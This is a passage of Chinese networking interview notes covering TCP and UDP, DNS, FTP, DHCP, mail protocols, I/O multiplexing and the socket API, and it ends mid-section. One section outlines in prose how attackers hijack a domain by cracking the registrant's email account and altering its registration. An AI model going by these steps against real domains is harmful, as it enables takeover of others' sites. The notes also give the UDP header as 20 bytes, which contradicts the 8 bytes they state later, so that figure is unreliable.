客户端发送的连接请求如果在网络中滞留，那么就会隔很长一段时间才能收到服务器端发回的连接确认。

**客户端等待一个超时重传时间之后，就会重新请求连接**。但是这个**滞留的连接请求最后还是会到达服务器**，如果不进行三次握手，那么服务器就**会打开两个连接**。

如果有第三次握手，客户端会忽略服务器之后发送的对滞留连接请求的连接确认，不进行第三次握手，因此就不会再次打开连接。

### TCP的四次挥手断开连接

<div class="image-wrapper" style="text-align: center">
<img src="..\\assets\post\2020-03-08\tcpdisconnect.png" alt="img" style="zoom:60%;" />
</div>



以下描述不讨论序号和确认号，因为序号和确认号的规则比较简单。并且不讨论 ACK，因为 ACK 在连接建立之后都为 1。

- 客户端 发送连接释放报文，`FIN=1`。
- 服务端 收到之后发出确认并进入`CLOSE_WAIT`状态，此时 TCP 属于半关闭状态，服务器 能向 客户端 发送数据但是 客户端 不能向 服务器 发送数据。
- 当 服务器 不再需要连接时，发送连接释放报文，`FIN=1`。
- 客户端 收到后发出确认ACK，进入 `TIME-WAIT` 状态，等待 `2 MSL（最大报文存活时间）`后释放连接。
- 服务器 收到 客户端 的确认ACK后释放连接。

#### 四次挥手的原因

客户端发送了 FIN 连接释放报文之后，服务器收到了这个报文，就进入了 `CLOSE-WAIT` 状态。

这个状态是为了让服务器端**发送还未传送完毕的数据**（全双工需要双方都断开连接），传送完毕之后，服务器会发送 FIN 连接释放报文。

#### TIME_WAIT

客户端接收到服务器端的 FIN 报文后进入此状态，此时并不是直接进入 `CLOSED` 状态，还需要等待一个时间计时器设置的时间 `2MSL`，这么做有两个理由：

- **确保最后一个确认报文能够到达**。如果 B 没收到 A 发送来的确认报文，那么就会重新发送连接释放请求报文，A 等待一段时间就是为了处理这种情况的发生。
- 等待一段时间是为了**让本连接持续时间内所产生的所有报文都从网络中消失**，使得下一个新的连接不会出现旧的连接请求报文。
- **大量TIME_WAIT**可能的原因是爬虫服务器，在完成爬取任务之后，会主动关闭连接，进入TIME_WAIT环节，然后在该阶段保持2MSL时间之后，彻底关闭回收资源。

#### 大量TIME_WAIT和CLOSE_WAIT影响

会导致占用大量的文件套接字无法释放，而一个机器可以打开的fd数量是有限的，如果超过了，就无法继续分配fd，也就无法建立新连接了。

#### 有很多 TIME-WAIT 状态如何解决

服务器可以设置 SO_REUSEADDR 套接字选项来通知内核，如果端口被占用，但 TCP 连接位于 TIME_WAIT 状态时可以重用端口。如果你的服务器程序停止后想立即重启，而新的套接字依旧希望使用同一端口，此时 SO_REUSEADDR 选项就可以避免 TIME-WAIT 状态。

也可以采用长连接的方式减少 TCP 的连接与断开，在长连接的业务中往往不需要考虑 TIME-WAIT 状态，但其实在长连接的业务中并发量一般不会太高。

### TIME_WAIT和CLOSE_WAIT的区别在哪?

默认客户端首先发起断开连接请求

- 从上图可以看出，CLOSE_WAIT是被动关闭形成的，当客户端发送FIN报文，服务端返回ACK报文后进入CLOSE_WAIT。
- TIME_WAIT是主动关闭形成的，当第四次挥手完成后，客户端进入TIME_WAIT状态。

### 为什么TCP连接时ACK和SYN同时发送，断开时分开发送

- 客户端请求释放时，服务器可能还有数据需要传输到客户端，因此服务端要先响应客户端`FIN`请求，然后传输未传完的数据，服务端传输完成后再提出`FIN`请求；
- 在连接的时候，没有中间数据传输，因此连接时的`ACK`和`SYN`可以一起发送

### 为什么TCP连接的时候是3次？两次是否可以？

不可以，主要从以下两方面考虑（假设客户端是首先发起连接请求）：

1. 假设建立TCP连接仅需要两次握手，那么如果第二次握手时，服务端返回给客户端的确认报文丢失了，客户端这边认为服务端没有和他建立连接，而服务端却以为已经和客户端建立了连接，并且可能向服务端已经开始向客户端发送数据，但客户端并不会接收这些数据，浪费了资源。如果是三次握手，不会出现双方连接还未完全建立成功就开始发送数据的情况。
2. 如果服务端接收到了一个早已失效的来自客户端的连接请求报文，会向客户端发送确认报文同意建立TCP连接。但因为客户端并不需要向服务端发送数据，所以此次TCP连接没有意义并且浪费了资源。

### 为什么TCP连接的时候是3次，关闭的时候却是4次？

因为需要确保通信双方都能通知对方释放连接，假设客服端发送完数据向服务端发送释放连接请求，当客户端并不知道，服务端是否已经发送完数据，所以此次断开的是客服端到服务端的单向连接，服务端返回给客户端确认报文后，服务端还能继续单向给客户端发送数据。当服务端发送完数据后还需要向客户端发送释放连接请求，客户端返回确认报文，TCP连接彻底关闭。所以断开TCP连接需要客户端和服务端分别通知对方并分别收到确认报文，一共需要四次。

### 如果已经建立了连接，但是客户端突然出现故障了怎么办？

如果TCP连接已经建立，在通信过程中，客户端突然故障，那么服务端不会一直等下去，过一段时间就关闭连接了。具体原理是TCP有一个保活机制，主要用在服务器端，用于检测已建立TCP链接的客户端的状态，防止因客户端崩溃或者客户端网络不可达，而服务器端一直保持该TCP链接，占用服务器端的大量资源(因为Linux系统中可以创建的总TCP链接数是有限制的)。

**保活机制原理：**设置TCP保活机制的保活时间keepIdle，即在TCP链接超过该时间没有任何数据交互时，发送保活探测报文；设置保活探测报文的发送时间间隔keepInterval；设置保活探测报文的总发送次数keepCount。如果在keepCount次的保活探测报文均没有收到客户端的回应，则服务器端即关闭与客户端的TCP链接。

### 谈谈你对停止等待协议的理解？

停止等待协议是为了实现可靠传输的，它的基本原理就是每发完一个分组就停止发送，等待对方确认。在收到确认后再发下一个分组；在停止等待协议中，若接收方收到重复分组，就丢弃该分组，但同时还要发送确认。主要包括以下几种情况：无差错情况、出现差错情况（超时重传）、确认丢失和确认迟到。

### 谈谈你对 ARQ 协议的理解？

**自动重传请求 ARQ 协议**

停止等待协议中超时重传是指只要超过一段时间仍然没有收到确认，就重传前面发送过的分组（认为刚才发送过的分组丢失了）。因此每发送完一个分组需要设置一个超时计时器，其重传时间应比数据在分组传输的平均往返时间更长一些。这种自动重传方式常称为自动重传请求 ARQ。

**连续 ARQ 协议**

连续 ARQ 协议可提高信道利用率。发送方维持一个发送窗口，凡位于发送窗口内的分组可以连续发送出去，而不需要等待对方确认。接收方一般采用累计确认，对按序到达的最后一个分组发送确认，表明到这个分组为止的所有分组都已经正确收到了。

### UDP

UDP（User Datagram Protocol，用户数据报协议），是一种无连接的传输层协议，提供面向事务的简单不可靠信息传送服务，其传输的单位是用户数据报。

适用于：DNS，SNMP，音视频通话，广播通信等，因为UDP是不可靠传输，所以当包数量比较少的时候使用UDP是比较适合的，避免了丢失大量的重要数据；对于音视频来说，因为UDP没有流量控制等，速度较快，同时丢掉一些数据包也是可以接受的。

### 特点

- 无连接
- 尽最大努力交付
- 面向报文（对于应用程序传下来的报文不合并也不拆分，只是添加UDP首部）
- 没有拥塞控制
- 支持一对一，一对多，多对一，多对多的交互通信
- 首部开销小（20字节）

### UDP首部格式

<div class="image-wrapper" style="text-align: center">
<img src="..\\assets\post\2020-03-08\udpheader.png" alt="img" style="zoom:40%;" />
</div>



首部字段只有 8 个字节，包括源端口、目的端口、长度、检验和。12 字节的伪首部是为了计算检验和临时添加的。

### UDP实现可靠传输

- 自己设计数据包的格式和通信流程
  - 可以在每一个数据包里面插入一个唯一的id，可以是timestamp或者递增的int
  - 在进行udp通信的时候，发送方记录id，接收方接收到之后也要发送id作为回应
  - 如果发送方收到回应，则发送下一个，如果没收到，就重传
  
- 开源程序：

  * RUDP：**RUDP 提供一组数据服务质量增强机制，如拥塞控制的改进、重发机制及淡化服务器算法等**，从而在包丢失和网络拥塞的情况下， RTP 客户机（实时位置）面前呈现的就是一个高质量的 RTP 流。在不干扰协议的实时特性的同时，可靠 UDP 的拥塞控制机制允许 TCP 方式下的流控制行为。

  * RTP：**RTP为数据提供了具有实时特征的端对端传送服务**，如在组播或单播网络服务下的交互式视频音频或模拟数据。应用程序通常在 UDP 上运行 RTP 以便使用其多路结点和校验服务；这两种协议都提供了传输层协议的功能。但是 RTP 可以与其它适合的底层网络或传输协议一起使用。如果底层网络提供组播方式，那么 RTP 可以使用该组播表传输数据到多个目的地。

    RTP 本身并没有提供按时发送机制或其它服务质量（QoS）保证，它依赖于底层服务去实现这一过程。 RTP 并不保证传送或防止无序传送，也不确定底层网络的可靠性。 RTP 实行有序传送， RTP 中的序列号允许接收方重组发送方的包序列，同时序列号也能用于决定适当的包位置，例如：在视频解码中，就不需要顺序解码。

  * UDT：基于UDP的数据传输协议（UDP-basedData Transfer Protocol，简称UDT）是一种互联网数据传输协议。**UDT的主要目的是支持高速广域网上的海量数据传输**，而互联网上的标准数据传输协议TCP在高带宽长距离网络上性能很差。

    顾名思义，UDT建于UDP之上，并引入新的拥塞控制和数据可靠性控制机制。UDT是面向连接的双向的应用层协议。它同时支持可靠的数据流传输和部分可靠的数据报传输。由于UDT完全在UDP上实现，它也可以应用在除了高速数据传输之外的其它应用领域，例如点到点技术（P2P），防火墙穿透，多媒体数据传输等等。

### TCP和UDP的区别

- TCP面向连接；UDP面向无连接
- TCP提供可靠的服务，即通过TCP连接传送的数据，无差错、不丢失、不重复、且按序到达；UDP尽最大努力交付，即不保证可靠交付
- TCP的逻辑通信信道是全双工的可靠信道；UDP是不可靠信道
- TCP都是一对一，点到点的；UDP支持一对一，一对多，多对一，多对多等的交互通信
- TCP面向字节流（可能出现粘包问题）；UDP面向报文
- TCP有拥塞控制；UDP没有，因此网络出现拥塞时不会使源主机的发送速率降低（对实时很有用，比如IP电话，实时视频会议等）
- TCP首部开销20字节；UDP首部开销字节8字节

## 应用层

### 域名系统（DNS，Domain Name System）

DNS是一个分布式数据库，提供了主机名和 IP 地址之间相互转换的服务。这里的分布式数据库是指，每个站点只保留它自己的那部分数据。

域名具有层次结构，从上到下依次为：根域名`.`、顶级域名`edu,com,gov,cn...`、二级域名`google,baidu...`。

DNS 可以使用 UDP 或者 TCP 进行传输，使用的端口号都为 `53`。大多数情况下 DNS 使用 UDP 进行传输，这就要求域名解析器和域名服务器都必须自己处理超时和重传从而保证可靠性。在两种情况下会使用 TCP 进行传输：

- 如果返回的响应超过的 512 字节（UDP 最大只支持 512 字节的数据）。
- 区域传送（区域传送是主域名服务器向辅助域名服务器传送变化的那部分数据）。

#### DNS的工作流程

**主机向本地域名服务器的查询一般是采用递归查询，而本地域名服务器向根域名的查询一般是采用迭代查询。**

递归查询主机向本地域名发送查询请求报文，而本地域名服务器不知道该域名对应的IP地址时，本地域名会继续向根域名发送查询请求报文，不是通知主机自己向根域名发送查询请求报文。迭代查询是，本地域名服务器向根域名发出查询请求报文后，根域名不会继续向顶级域名服务器发送查询请求报文，而是通知本地域名服务器向顶级域名发送查询请求报文。

1. 在浏览器中输入www.baidu.com域名，操作系统会先检查自己本地的hosts文件是否有这个域名的映射关系，如果有，就先调用这个IP地址映射，完成域名解析。
2. 如果hosts文件中没有，则查询本地DNS解析器缓存，如果有，则完成地址解析。
3. 如果本地DNS解析器缓存中没有，则去查找本地DNS服务器，如果查到，完成解析。
4. 如果没有，则本地服务器会向根域名服务器发起查询请求。根域名服务器会告诉本地域名服务器去查询哪个顶级域名服务器。
5. 本地域名服务器向顶级域名服务器发起查询请求，顶级域名服务器会告诉本地域名服务器去查找哪个权限域名服务器。
6. 本地域名服务器向权限域名服务器发起查询请求，权限域名服务器告诉本地域名服务器www.baidu.com所对应的IP地址。
7. 本地域名服务器告诉主机www.baidu.com所对应的IP地址。

#### DNS 为什么用 UDP

其实 DNS 的整个过程是既使用 TCP 又使用 UDP。

当进行区域传送（主域名服务器向辅助域名服务器传送变化的那部分数据）时会使用 TCP，因为数据同步传送的数据量比一个请求和应答的数据量要多，而 TCP 允许的报文长度更长，因此为了保证数据的正确性，会使用基于可靠连接的 TCP。

当客户端向 DNS 服务器查询域名 ( 域名解析) 的时候，一般返回的内容不会超过 UDP 报文的最大长度，即 512 字节。用 UDP 传输时，不需要经过 TCP 三次握手的过程，从而大大提高了响应速度，但这要求域名解析器和域名服务器都必须自己处理超时和重传从而保证可靠性。

#### 简单说下怎么实现 DNS 劫持

DNS 劫持即域名劫持，是通过将原域名对应的 IP 地址进行替换从而使得用户访问到错误的网站或者使得用户无法正常访问网站的一种攻击方式。域名劫持往往只能在特定的网络范围内进行，范围外的 DNS 服务器能够返回正常的 IP 地址。攻击者可以冒充原域名所属机构，通过电子邮件的方式修改组织机构的域名注册信息，或者将域名转让给其它组织，并将新的域名信息保存在所指定的 DNS 服务器中，从而使得用户无法通过对原域名进行解析来访问目的网址。

具体实施步骤如下：

① 获取要劫持的域名信息：攻击者首先会访问域名查询站点查询要劫持的域名信息。

② 控制域名相应的 E-MAIL 账号：在获取到域名信息后，攻击者通过暴力破解或者专门的方法破解公司注册域名时使用的 E-mail 账号所对应的密码。更高级的攻击者甚至能够直接对 E-mail 进行信息窃取。

③ 修改注册信息：当攻击者破解了 E-MAIL 后，会利用相关的更改功能修改该域名的注册信息，包括域名拥有者信息，DNS 服务器信息等。

④ 使用 E-MAIL 收发确认函：在修改完注册信息后，攻击者在 E-mail 真正拥有者之前收到修改域名注册信息的相关确认信息，并回复确认修改文件，待网络公司恢复已成功修改信件后，攻击者便成功完成 DNS 劫持。

用户端的一些预防手段：

直接通过 IP 地址访问网站，避开 DNS 劫持。

由于域名劫持往往只能在特定的网络范围内进行，因此一些高级用户可以通过网络设置让 DNS 指向正常的域名服务器以实现对目的网址的正常访问，例如将计算机首选 DNS 服务器的地址固定为 8.8.8.8。

### 文件传送协议FTP/TFTP

#### FTP（File Transfer Protocol）

FTP 使用 TCP 进行连接，它需要两个连接来传送一个文件：

- 控制连接：服务器打开端口号 21 等待客户端的连接，客户端主动建立连接后，使用这个连接将客户端的命令传送给服务器，并传回服务器的应答。
- 数据连接：用来传送一个文件数据。

根据数据连接是否是服务器端主动建立，FTP 有主动和被动两种模式：

- 主动模式：服务器端主动建立数据连接，其中服务器端的端口号为 20，客户端的端口号随机，但是必须大于 1024，因为 0~1023 是熟知端口号。

<div class="image-wrapper" style="text-align: center">
<img src="..\\assets\post\2020-03-01\ftp1.png" alt="img" style="zoom:60%;" />
</div>

- 被动模式：客户端主动建立数据连接，其中客户端的端口号由客户端自己指定，服务器端的端口号随机。

<div class="image-wrapper" style="text-align: center">
<img src="..\\assets\post\2020-03-01\ftp2.png" alt="img" style="zoom:60%;" />
</div>

主动模式要求客户端开放端口号给服务器端，需要去配置客户端的防火墙。被动模式只需要服务器端开放端口号即可，无需客户端配置防火墙。但是被动模式会导致服务器端的安全性减弱，因为开放了过多的端口号。

#### TFTP（Trivial File Transfer Protocol）

简单文件传输协议：一个小且易实现的文件传输协议，使用客户-服务器方式，使用udp数据报，只支持文件传输不支持交互，没有列目录，不能对用户进行身份鉴定。

### 动态主机配置协议DHCP

DHCP（Dynamic Host Configuration Protocol）提供了即插即用的联网方式，用户不再需要手动配置 IP 地址等信息。

DHCP 配置的内容不仅是 IP 地址，还包括子网掩码、网关 IP 地址。

DHCP 工作过程如下：

1. 客户端发送` Discover` 报文，该报文的目的地址为 `255.255.255.255:67`，源地址为 `0.0.0.0:68`，被放入 UDP 中，该报文被广播到同一个子网的所有主机上。如果客户端和 DHCP 服务器不在同一个子网，就需要使用中继代理。
2. DHCP 服务器收到 `Discover` 报文之后，发送 `Offer` 报文给客户端，该报文包含了客户端所需要的信息。因为客户端可能收到多个 DHCP 服务器提供的信息，因此客户端需要进行选择。
3. 如果客户端选择了某个 DHCP 服务器提供的信息，那么就发送` Request` 报文给该 DHCP 服务器。
4. DHCP 服务器发送 `Ack` 报文，表示客户端此时可以使用提供给它的信息。

<div class="image-wrapper" style="text-align: center">
<img src="..\\assets\post\2020-03-01\dhcp.png" alt="img" style="zoom:80%;" />
</div>

### 远程登录协议TELNET

TELNET（Telecommunication Network Protocol）电信网络协议是`tcp/ip`协议族中的一员，是internet远程登陆服务的标准协议和主要方式。他为用户提供了在本地计算机上完成远程主机工作的能力。

### 电子邮件协议SMTP/POP3/IMAP

一个电子邮件系统由三部分组成：用户代理、邮件服务器以及邮件协议。

邮件协议包含发送协议和读取协议，发送协议常用 SMTP，读取协议常用 POP3 和 IMAP。

<div class="image-wrapper" style="text-align: center">
<img src="..\\assets\post\2020-03-01\mail.png" alt="img" style="zoom:50%;" />
</div>

#### SMTP

Simple Mail Transfer Protocol，简单邮件传输协议是一组用于由源地址到目的地址传送邮件的规则，由他来控制信件的中转方式。

SMTP协议属于`tcp/ip`协议簇，他帮助每台计算机在发送或中转信件时找到下一个目的地。

SMTP只能发送ascii码，而互联网邮件扩充mime可以发送二进制文件，增加了邮件主体的结构，定义了非ascii码的编码规则。

#### POP3

POP3 的特点是只要用户从服务器上读取了邮件，就把该邮件删除。但最新版本的 POP3 可以不删除邮件。

#### IMAP

IMAP 协议中客户端和服务器上的邮件保持同步，如果不手动删除邮件，那么服务器上的邮件也不会被删除。IMAP 这种做法可以让用户随时随地去访问服务器上的邮件。

### WWW

www（World Wide Web）万维网是一个由许多互相链接的超文本组成的系统，通过互联网访问

### HTTP

见其他文章

## 有了IP地址，为什么还要用MAC地址？

简单来说，标识网络中的一台计算机，比较常用的就是IP地址和MAC地址，但计算机的IP地址可由用户自行更改，管理起来相对困难，而MAC地址不可更改，所以一般会把IP地址和MAC地址组合起来使用。具体是如何组合使用的在上面的ARP协议中已经讲的很清楚了。

那只用MAC地址不用IP地址可不可以呢？其实也是不行的，因为在最早就是MAC地址先出现的，并且当时并不用IP地址，只用MAC地址，后来随着网络中的设备越来越多，整个路由过程越来越复杂，便出现了子网的概念。对于目的地址在其他子网的数据包，路由只需要将数据包送到那个子网即可，这个过程就是上面说的ARP协议。

那为什么要用IP地址呢？是因为IP地址是和地域相关的，对于同一个子网上的设备，IP地址的前缀都是一样的，这样路由器通过IP地址的前缀就知道设备在在哪个子网上了，而只用MAC地址的话，路由器则需要记住每个MAC地址在哪个子网，这需要路由器有极大的存储空间，是无法实现的。

IP地址可以比作为地址，MAC地址为收件人，在一次通信过程中，两者是缺一不可的。

# 计算机网络之SOCKET

Socket是在传输层抽象出来的一个抽象层，本质是一个接口。

## I/OIO模型

一个输入操作通常包括两个阶段：

- 等待数据准备好
- 从内核向进程复制数据

对于一个套接字上的输入操作，第一步通常涉及等待数据从网络中到达。当所等待数据到达时，它被复制到内核中的某个缓冲区。第二步就是把数据从内核缓冲区复制到应用进程缓冲区。

Unix 有五种 I/O 模型：

- 阻塞式 I/O
- 非阻塞式 I/O
- I/O 复用（select 和 poll）
- 信号驱动式 I/O（SIGIO）
- 异步 I/O（AIO）

### 阻塞式I/O

应用进程被阻塞，直到数据从内核缓冲区复制到应用进程缓冲区中才返回。

应该注意到，在阻塞的过程中，其它应用进程还可以执行，因此阻塞不意味着整个操作系统都被阻塞。因为其它应用进程还可以执行，所以不消耗 CPU 时间，这种模型的 CPU 利用率会比较高。

下图中，`recvfrom()` 用于接收 Socket 传来的数据，并复制到应用进程的缓冲区 `buf` 中。这里把 `recvfrom()` 当成系统调用。

```c++
ssize_t recvfrom(int sockfd, void *buf, size_t len, int flags, struct sockaddr *src_addr, socklen_t *addrlen);
```

<div class="image-wrapper" style="text-align: center">
<img src="..\\assets\post\2020-03-05\blockIO.png" alt="img" style="zoom:80%;" />
</div>


### 非阻塞式IO

应用进程执行系统调用之后，内核返回一个错误码。应用进程可以继续执行，但是需要不断的执行系统调用来获知 I/O 是否完成，这种方式称为轮询（polling）。

由于 CPU 要处理更多的系统调用，因此这种模型的 CPU 利用率比较低。

<div class="image-wrapper" style="text-align: center">
<img src="..\\assets\post\2020-03-05\noblockIO.png" alt="img" style="zoom:80%;" />
</div>


### I/O复用

使用 `select` 或者 `poll` 等待数据，并且可以等待多个套接字中的任何一个变为可读。这一过程**会被阻塞**，当某一个套接字可读时返回，之后再使用 `recvfrom` 把数据从内核复制到进程中。

它可以让单个进程具有处理多个 I/O 事件的能力。又被称为 `Event Driven I/O`，即事件驱动 I/O。

如果一个 Web 服务器没有 I/O 复用，那么每一个 Socket 连接都需要创建一个线程去处理。如果同时有几万个连接，那么就需要创建相同数量的线程。相比于多进程和多线程技术，I/O 复用不需要进程线程创建和切换的开销，系统开销更小。

<div class="image-wrapper" style="text-align: center">
<img src="..\\assets\post\2020-03-05\IOreuse.png" alt="img" style="zoom:80%;" />
</div>


### 信号驱动I/O

应用进程使用 `sigaction` 系统调用，内核立即返回，应用进程可以继续执行，也就是说**等待数据阶段应用进程是非阻塞的**。内核在数据到达时向应用进程发送 SIGIO 信号，应用进程收到之后在信号处理程序中调用 `recvfrom` 将数据从内核复制到应用进程中。

相比于非阻塞式 I/O 的轮询方式，信号驱动 I/O 的 CPU 利用率更高。

<div class="image-wrapper" style="text-align: center">
<img src="..\\assets\post\2020-03-05\signalIO.png" alt="img" style="zoom:80%;" />
</div>


### 异步I/O

应用进程执行 `aio_read` 系统调用会立即返回，应用进程可以继续执行，不会被阻塞，内核会在所有操作完成之后向应用进程发送信号。

异步 I/O 与信号驱动 I/O 的区别在于，**异步 I/O 的信号是通知应用进程 I/O 完成，而信号驱动 I/O 的信号是通知应用进程可以开始 I/O。**

<div class="image-wrapper" style="text-align: center">
<img src="..\\assets\post\2020-03-05\asynIO.png" alt="img" style="zoom:80%;" />
</div>


### 模型比较

- 同步 I/O：将数据从内核缓冲区复制到应用进程缓冲区的阶段（第二阶段），应用进程会阻塞。
- 异步 I/O：第二阶段应用进程不会阻塞。

同步 I/O 包括阻塞式 I/O、非阻塞式 I/O、I/O 复用和信号驱动 I/O ，它们的主要区别在第一个阶段。

非阻塞式 I/O 、信号驱动 I/O 和异步 I/O 在第一阶段不会阻塞。

<div class="image-wrapper" style="text-align: center">
<img src="..\\assets\post\2020-03-05\IO.png" alt="img" style="zoom:80%;" />
</div>


## I/OIO复用

`select/poll/epoll` 都是 I/O 多路复用的具体实现，`select` 出现的最早，之后是 `poll`，再是 `epoll`。

### select

```c++
int select(int n, fd_set *readfds, fd_set *writefds, fd_set *exceptfds, struct timeval *timeout);
```

select 允许应用程序监视一组文件描述符，等待一个或者多个描述符成为就绪状态，从而完成 I/O 操作。

- `fd_set` 使用数组实现，数组大小使用 FD_SETSIZE 定义，所以只能监听少于 FD_SETSIZE 数量的描述符。有三种类型的描述符类型：`readset`、`writeset`、`exceptset`，分别对应读、写、异常条件的描述符集合。
- timeout 为超时参数，调用 select 会一直阻塞直到有描述符的事件到达或者等待的时间超过 `timeout`。
- 成功调用返回结果大于 0，出错返回结果为 -1，超时返回结果为 0。

单个进程可监视的fd数量有限制，即能监听端口的大小有限。

对socket进行扫描时是线性扫描，即采用轮询的方式，效率较低。

需要维护一个用来存放大量fd的数据结构，这样会使得用户空间和内核空间在传毒该结构时复制开销大。

### poll

`poll `的功能与 `select` 类似，也是等待一组描述符中的一个成为就绪状态。和select本质上没有区别，它将用户传入的数组拷贝到内核空间，然后查询每个fd对应的设备状态，如果设备就绪则在设备等待队列中加入一项并继续遍历，如果遍历完所有fd后而没有发现就绪设备，则挂起当前进程，直到设备就绪或者主动超时，被唤醒后又要再次遍历fd。

```c++
int poll(struct pollfd *fds, unsigned int nfds, int timeout);
```

`poll` 中的描述符是 `pollfd` 类型的数组，`pollfd` 的定义如下：

```c++
struct pollfd {
	int   fd;         /* file descriptor */
	short events;     /* requested events */
	short revents;    /* returned events */
};
```

没有最大连接数的限制，因为它是基于链表来存储的。

### select和poll比较

#### 功能

`select` 和 `poll` 的功能基本相同，不过在一些实现细节上有所不同。

- `select` 会修改描述符，而 poll 不会；
- `select` 的描述符类型使用数组实现，`FD_SETSIZE` 大小默认为 1024，因此默认只能监听少于 1024 个描述符。如果要监听更多描述符的话，需要修改 `FD_SETSIZE` 之后重新编译；而 `poll` 没有描述符数量的限制；
- `poll` 提供了更多的事件类型，并且对描述符的重复利用上比 select 高。
- 如果一个线程对某个描述符调用了 `select` 或者 `poll`，另一个线程关闭了该描述符，会导致调用结果不确定。

#### 速度

`select 和 poll` 速度都比较慢，**每次调用都需要将全部描述符从应用进程缓冲区复制到内核缓冲区。**

#### 可移植性

几乎所有的系统都支持 `select`，但是只有比较新的系统支持 `poll`。

### epoll

```c++
int epoll_create(int size);
int epoll_ctl(int epfd, int op, int fd, struct epoll_event *event)；
int epoll_wait(int epfd, struct epoll_event * events, int maxevents, int timeout);
```

`epoll_ctl()` 用于向内核注册新的描述符或者是**改变某个文件描述符的状态**。已注册的描述符在内核中会被维护在一棵红黑树上，通过回调函数内核会将 I/O 准备好的描述符加入到一个链表中管理，进程调用 `epoll_wait()` 便可以得到事件完成的描述符。

从上面的描述可以看出，`epoll` 只需要将描述符从进程缓冲区向内核缓冲区拷贝一次，并且进程不需要通过轮询来获得事件完成的描述符。

`epoll` 仅适用于 **Linux OS。**

`epoll` 比 `select` 和 `poll` 更加灵活而且没有描述符数量限制。

可以理解为event poll，不同于忙轮询和无差别轮询，epoll会把哪个流发生了怎么样的IO事件通知我们，所以说epoll实际上是事件驱动（每个事件关联上fd）的，此时我们对这些流的操作都是有意义的。

`epoll` 对多线程编程更有友好，一个线程调用了 `epoll_wait()` 另一个线程关闭了同一个描述符也不会产生像 `select` 和 `poll` 的不确定情况。

### epoll工作模式

`epoll` 的描述符事件有两种触发模式：`LT（level trigger`）和 `ET（edge trigger）`

#### LT模式

当 `epoll_wait()` 检测到描述符事件到达时，将此事件通知进程，进程可以不立即处理该事件，下次调用 `epoll_wait()` 会再次通知进程。是默认的一种模式，并且同时支持 `Blocking` 和 `No-Blocking`。

编程与poll/select接近，符合一直以来的习惯，不易出错。

#### ET模式（高速模式）

和 LT 模式不同的是，通知之后进程必须立即处理事件，下次再调用 `epoll_wait()` 时不会再得到事件到达的通知。

很大程度上减少了 `epoll` 事件被重复触发的次数，因此效率要比 LT 模式高。只支持 `No-Blocking`，以避免由于一个文件句柄的阻塞读/阻塞写操作把处理多个文件描述符的任务饿死。

这种模式比水平触发效率高，系统不会充斥大量不关心的就绪文件描述符。

ET的编程可以做到更加简洁，某些场景下更高效，但另一方面容易遗漏事件，容易产生bug。

##### 为什么要设置成非阻塞型IO

ET模式下每次write或者read需要循环write或read直到返回EAGAIN错误。以读操作为例，这时因为ET模式只在socket描述符状态发生变化时才触发事件，如果下一次把socket内核缓冲区的数据读完，会导致socket内核缓冲区中即使还有一部分数据，该socket的可读事件也不会触发。所以如果使用阻塞性IO，则程序一定会阻塞在最后一次write或者read操作，即一定要使用非阻塞型IO。

#### LT模式相比于ET模式

- 优点：事件循环处理简单，无序关注应用层是否有缓冲区或者缓冲区是否满，只管上报事件就可以了
- 缺点：可能经常上报，导致影响性能。

#### epoll优点

- 没有最大描述符的限制，远大于1024
- 效率提升，不是轮询的方式，不会随着fd数目增加效率下降，只有活跃可用的fd才会调用callback函数；即epoll最大的优点在于它只管活跃的链接，而和链接总数无关，因此在实际的网络环境中，epoll的效率远高于select和poll
- 内存拷贝，利用mmap()文件映射内存加速与内核空间的消息传递；即epoll适用mmap减少复制开销。

### 应用场景

很容易产生一种错觉认为只要用 `epoll` 就可以了，`select` 和 `poll` 都已经过时了，其实它们都有各自的使用场景。

#### select

`select` 的 `timeout` 参数精度为微秒，而 `poll` 和 `epoll` 为毫秒，因此 `select` 更加适用于实时性要求比较高的场景，比如核反应堆的控制。

`select` 可移植性更好，几乎被所有主流平台所支持。

#### poll

`poll` 没有最大描述符数量的限制，如果平台支持并且对实时性要求不高，应该使用 `poll` 而不是 `select`。

#### epoll

只需要运行在 Linux 平台上，有大量的描述符需要同时轮询，并且这些连接最好是长连接。

需要同时监控小于 1000 个描述符，就没有必要使用 `epoll`，因为这个应用场景下并不能体现 `epoll` 的优势。

需要监控的描述符状态变化多，而且都是非常短暂的，也没有必要使用 `epoll`。因为 `epoll` 中的所有描述符都存储在内核中，造成每次需要对描述符的状态改变都需要通过 `epoll_ctl()` 进行系统调用，频繁系统调用降低效率。并且 `epoll` 的描述符存储在内核，不容易调试。

## Socket编程

`socket`起源于`Unix`，而`Unix/Linux`基本哲学之一就是“一切皆文件”，都可以用“`打开open –> 读写write/read –> 关闭close`”模式来操作。Socket就是该模式的一个实现，socket即是一种特殊的文件，一些socket函数就是对其进行的操作（读/写IO、打开、关闭）

### socket()函数

```c++
int socket(int domain, int type, int protocol);
```

socket函数对应于普通文件的打开操作。普通文件的打开操作返回一个文件描述字，而**socket()**用于创建一个socket描述符（`socket descriptor`），它唯一标识一个socket。这个socket描述字跟文件描述字一样，后续的操作都有用到它，把它作为参数，通过它来进行一些读写操作。

正如可以给`fopen`的传入不同参数值，以打开不同的文件。创建socket的时候，也可以指定不同的参数创建不同的socket描述符，socket函数的三个参数分别为：

- `domain`：即协议域，又称为协议族（family）。常用的协议族有，`AF_INET`、`AF_INET6`、`AF_LOCAL`（或称`AF_UNIX`，Unix域socket）、`AF_ROUTE`等等。协议族决定了socket的地址类型，在通信中必须采用对应的地址，如AF_INET决定了要用ipv4地址（32位的）与端口号（16位的）的组合、AF_UNIX决定了要用一个绝对路径名作为地址。
- `type`：指定socket类型。常用的socket类型有，`SOCK_STREAM`、`SOCK_DGRAM`、`SOCK_RAW`、`SOCK_PACKET`、`SOCK_SEQPACKET`等等（socket的类型有哪些？）。
- `protocol`：顾名思义，就是指定协议。常用的协议有，`IPPROTO_TCP`、`IPPTOTO_UDP`、`IPPROTO_SCTP`、`IPPROTO_TIPC`等，它们分别对应TCP传输协议、UDP传输协议、STCP传输协议、TIPC传输协议）。

注意：**并不是上面的type和protocol可以随意组合的**，如SOCK_STREAM不可以跟IPPROTO_UDP组合。当protocol为0时，会自动选择type类型对应的默认协议。

当我们调用**socket**创建一个socket时，返回的socket描述字它存在于协议族（address family，AF_XXX）空间中，但没有一个具体的地址。如果想要给它赋值一个地址，就必须调用bind()函数，否则就当调用connect()、listen()时系统会自动随机分配一个端口。

### bind()函数

```c++
int bind(int sockfd, const struct sockaddr *addr, socklen_t addrlen);
```

函数的三个参数分别为：

